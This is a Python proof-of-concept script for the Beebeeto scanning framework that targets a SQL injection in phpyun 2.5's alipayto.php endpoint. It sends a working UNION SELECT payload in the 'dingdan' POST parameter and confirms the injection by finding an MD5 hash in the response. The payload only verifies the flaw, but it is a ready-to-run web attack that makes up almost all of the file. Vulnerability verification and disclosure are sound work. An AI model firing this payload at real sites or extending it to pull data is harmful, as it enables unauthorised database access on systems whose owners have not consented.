#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0214',
            'name': 'phpyun 2.5 /api/alipay/alipayto.php SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-12-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpyun',
            'vul_version': ['2.5'],
            'type': 'SQL Injection',
            'tag': ['phpyun漏洞', 'SQL注入漏洞', '/api/alipay/alipayto.php', 'php'],
            'desc': '''
                    phpyun 2.5 在 /api/alipay/alipayto.php 中，提交POST[dingdan]参数存在SQL注入漏洞。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-62513',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/api/alipay/alipayto.php'
        post_content = r'''dingdan=123' and 1=2 UNION SELECT 1,2,3,4,md5('usakiller'),6,7,8,9,10,11,12 %23'''
        req = urllib2.Request(verify_url, post_content)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Data: ' + post_content
        content = urllib2.urlopen(req).read()
        if '5858f22c2c4fddb92961c716601b01c1' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['post_content'] = post_content
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())